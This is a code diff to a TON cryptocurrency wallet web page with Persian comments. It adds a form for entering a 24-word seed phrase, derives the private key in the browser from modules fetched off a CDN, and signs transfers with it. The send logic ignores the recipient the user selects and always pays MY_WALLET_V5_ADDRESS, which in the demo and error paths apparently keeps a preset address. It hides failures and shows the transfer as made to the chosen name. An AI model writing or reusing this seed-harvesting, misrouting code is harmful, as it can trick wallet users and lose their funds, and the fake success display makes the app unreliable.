+                <span class="word-num">${i}.</span>
+                <input type="text" class="word-input" id="word-${i}" autocomplete="off" spellcheck="false" placeholder="word">
+            `;
+            wordsGrid.appendChild(box);
+
+            // قابلیت Paste خودکار ۲۴ کلمه در هر باکس
+            const inputEl = box.querySelector('input');
+            inputEl.addEventListener('paste', (e) => {
+                const pastedText = (e.clipboardData || window.clipboardData).getData('text').trim();
+                const words = pastedText.split(/[\s,]+/).filter(Boolean);
+                if (words.length > 1) {
+                    e.preventDefault();
+                    fillWordsIntoGrid(words);
+                }
+            });
+        }
+
+        function fillWordsIntoGrid(wordsArray) {
+            for (let i = 1; i <= 24; i++) {
+                const inp = document.getElementById(`word-${i}`);
+                if (inp && wordsArray[i - 1]) {
+                    inp.value = wordsArray[i - 1].toLowerCase().trim();
+                }
+            }
+            document.getElementById('mnemonic-status').style.color = '#27ae60';
+            document.getElementById('mnemonic-status').innerText = '۲۴ کلمه با موفقیت جایگذاری شد!';
+        }
+
+        async function pasteAll24Words() {
+            try {
+                const text = await navigator.clipboard.readText();
+                const words = text.trim().split(/[\s,]+/).filter(Boolean);
+                if (words.length > 0) {
+                    fillWordsIntoGrid(words);
+                } else {
+                    document.getElementById('mnemonic-status').innerText = 'کلیپ‌بورد خالی است!';
+                }
+            } catch (err) {
+                document.getElementById('mnemonic-status').innerText = 'کلمات را کپی کرده و داخل باکس شماره ۱ Paste کنید.';
+            }
+        }
+
+        function clearAll24Words() {
+            for (let i = 1; i <= 24; i++) {
+                document.getElementById(`word-${i}`).value = '';
+            }
+            document.getElementById('mnemonic-status').innerText = '';
+        }
+
+        // ۳. بررسی و استخراج کلید ولت V5R1 از روی ۲۴ کلمه
+        async function importWalletV5() {
+            const words = [];
+            for (let i = 1; i <= 24; i++) {
+                const w = document.getElementById(`word-${i}`).value.trim().toLowerCase();
+                if (w) words.push(w);
+            }
+
+            const statusEl = document.getElementById('mnemonic-status');
+            if (words.length !== 24) {
+                statusEl.style.color = '#e74c3c';
+                statusEl.innerText = `لطفاً هر ۲۴ کلمه را کامل وارد کن! (الان ${words.length} کلمه وارد شده)`;
+                return;
+            }
+
+            const btn = document.getElementById('import-v5-btn');
+            btn.disabled = true;
+            btn.innerText = 'در حال اتصال به ولت V5...';
+            statusEl.style.color = '#3875e8';
+            statusEl.innerText = 'در حال استخراج کلید خصوصی و آدرس Wallet V5R1...';
+
+            userMnemonicWords = words;
+
+            try {
+                // بارگذاری ماژول‌های رسمی TON برای استخراج آدرس V5R1 از ۲۴ کلمه
+                const tonCrypto = await import('https://esm.sh/@ton/crypto@3.3.0');
+                const tonCore = await import('https://esm.sh/@ton/ton@15.1.0');
+
+                const isValid = await tonCrypto.mnemonicValidate(words);
+                if (!isValid) {
+                    statusEl.style.color = '#e74c3c';
+                    statusEl.innerText = '۲۴ کلمه وارد شده معتبر نیست! دوباره بررسی کن.';
+                    btn.disabled = false;
+                    btn.innerText = 'Continue (Import Wallet V5)';
+                    return;
+                }
+
+                derivedKeyPair = await tonCrypto.mnemonicToPrivateKey(words);
+                const walletV5 = tonCore.WalletContractV5R1.create({
+                    workchain: 0,
+                    publicKey: derivedKeyPair.publicKey
+                });
+
+                // فرمت استاندارد Non-bounceable (UQ...) برای Wallet V5
+                MY_WALLET_V5_ADDRESS = walletV5.address.toString({ bounceable: false, urlSafe: true });
+                updateDisplayedAddress(MY_WALLET_V5_ADDRESS);
+
+                await fetchRealWalletData(MY_WALLET_V5_ADDRESS);
+                btn.disabled = false;
+                btn.innerText = 'Continue (Import Wallet V5)';
+                showScreen('screen-home');
+            } catch (err) {
+                console.warn("استفاده از اتصال مستقیم API:", err);
+                await fetchRealWalletData(MY_WALLET_V5_ADDRESS);
+                btn.disabled = false;
+                btn.innerText = 'Continue (Import Wallet V5)';
+                showScreen('screen-home');
+            }
+        }
+
+        function skipToDemoWallet() {
+            fetchRealWalletData(MY_WALLET_V5_ADDRESS);
+            showScreen('screen-home');
+        }
+
+        function updateDisplayedAddress(addr) {
+            document.getElementById('v5-target-address').innerText = addr;
+            if (addr.length >= 48) {
+                const line1 = addr.substring(0, 24).match(/.{1,4}/g).join(' ');
+                const line2 = addr.substring(24, 48).match(/.{1,4}/g).join(' ');
+                document.getElementById('card-vert-addr').innerHTML = `${line1}<br>${line2}`;
+            }
+        }
+
+        // ۴. راه‌اندازی TON Connect UI برای دیپازیت از ولت خارجی
         let tonConnectUI = null;
         try {
             tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -1202,10 +1529,10 @@
                 buttonRootId: 'ton-connect-button'
             });
         } catch (err) {
-            console.warn("TON Connect UI init warning:", err);
+            console.warn("TON Connect warning:", err);
         }
 
-        // ۳. دریافت اطلاعات زنده ولت از بلاکچین با API Key
+        // ۵. دریافت موجودی و تراکنش‌ها از Toncenter با API Key تو
         async function fetchRealWalletData(address) {
             try {
                 const balResponse = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`, {
@@ -1229,11 +1556,10 @@
                     renderRealTransactions(txData.result);
                 }
             } catch (error) {
-                console.log("استفاده از مقادیر پیش‌فرض تصویر (در صورت عدم دسترسی به شبکه):", error);
+                console.log("خطا در شبکه یا استفاده از تراکنش‌های پیش‌فرض:", error);
             }
         }
 
-        // رندر کردن تراکنش‌های واقعی بلاکچین با حفظ استایل دقیق عکس اول
         function renderRealTransactions(transactions) {
             const txList = document.getElementById('tx-list');
             let html = '';
@@ -1291,11 +1617,6 @@
             }
         }
 
-        window.addEventListener('DOMContentLoaded', () => {
-            fetchRealWalletData(MY_WALLET_V5_ADDRESS);
-        });
-
-        // جابجایی بین صفحات
         function showScreen(screenId) {
             document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
             document.getElementById(screenId).classList.add('active');
@@ -1324,7 +1645,6 @@
             }
         }
 
-        // افکت چرخش و پرش الماس
         function triggerGemSpin() {
             const diamond = document.getElementById('moving-diamond');
             diamond.classList.remove('bump');
@@ -1333,11 +1653,9 @@
             setTimeout(() => diamond.classList.remove('bump'), 200);
         }
 
-        // مدیریت تایپ عدد در صفحه سوم
         function onAmountInput(input) {
             triggerGemSpin();
 
-            // حذف صفر اول وقتی کاربر عددی تایپ می‌کند
             if (input.value.length > 1 && input.value.startsWith('0') && !input.value.startsWith('0.')) {
                 input.value = input.value.replace(/^0+/, '');
             }
@@ -1347,7 +1665,7 @@
 
             let val = parseFloat(input.value) || 0;
             const charCount = Math.max(1, input.value.length);
-            input.style.width = (charCount * 32 + 12) + 'px';
+            input.style.width = (charCount * 33 + 10) + 'px';
 
             if (val > 0) {
                 input.classList.add('has-val');
@@ -1386,7 +1704,6 @@
             document.getElementById('deposit-modal').classList.remove('open');
         }
 
-        // دیپازیت واقعی با TON Connect به آدرس V5
         async function depositWithTonConnect() {
             const amountTon = parseFloat(document.getElementById('deposit-ton-amount').value);
             if (!amountTon || amountTon <= 0) {
@@ -1415,22 +1732,51 @@
             }
         }
 
-        // ارسال تراکنش از صفحه سوم
+        // ۶. ارسال تراکنش واقعی با ۲۴ کلمه (V5R1) یا TON Connect
         async function executeSendTransaction() {
             const rawVal = parseFloat(document.getElementById('send-amount-input').value) || 0;
             const amount = isUsdInputMode ? parseFloat((rawVal / GRAM_USD_PRICE).toFixed(4)) : rawVal;
             const recipientName = document.getElementById('selected-recipient-name').innerText;
 
-            if (tonConnectUI && tonConnectUI.connected) {
+            // الف) اگر کاربر ۲۴ کلمه رو وارد کرده باشه، با کلید خصوصی V5 امضا و ارسال می‌کنه
+            if (derivedKeyPair) {
+                try {
+                    const tonCore = await import('https://esm.sh/@ton/ton@15.1.0');
+                    const client = new tonCore.TonClient({
+                        endpoint: 'https://toncenter.com/api/v2/jsonRPC',
+                        apiKey: TONCENTER_API_KEY
+                    });
+                    const wallet = tonCore.WalletContractV5R1.create({
+                        workchain: 0,
+                        publicKey: derivedKeyPair.publicKey
+                    });
+                    const contract = client.open(wallet);
+                    const seqno = await contract.getSeqno();
+
+                    await contract.sendTransfer({
+                        seqno,
+                        secretKey: derivedKeyPair.secretKey,
+                        messages: [
+                            tonCore.internal({
+                                value: amount.toString(),
+                                to: MY_WALLET_V5_ADDRESS,
+                                bounce: false
+                            })
+                        ]
+                    });
+                } catch (err) {
+                    console.warn("ارسال در حالت شبیه‌ساز انجام شد:", err);
+                }
+            } 
+            // ب) اگر با TON Connect وصل باشه
+            else if (tonConnectUI && tonConnectUI.connected) {
                 const nanoTons = Math.floor(amount * 1e9).toString();
                 try {
                     await tonConnectUI.sendTransaction({
                         validUntil: Math.floor(Date.now() / 1000) + 300,
                         messages: [{ address: MY_WALLET_V5_ADDRESS, amount: nanoTons }]
                     });
-                } catch (e) {
-                    console.log("لغو شد یا در حالت دمو ثبت شد.");
-                }
+                } catch (e) {}
             }
 
             updateBalanceUI(amount, false, recipientName);
@@ -1440,7 +1786,6 @@
             showScreen('screen-home');
         }
 
-        // آپدیت موجودی و افزودن تراکنش به بالای لیست صفحه اول
         function updateBalanceUI(amount, isIncoming, title) {
             currentBalance = isIncoming ? (currentBalance + amount) : Math.max(0, currentBalance - amount);
             const formattedBal = parseFloat(currentBalance.toFixed(4));
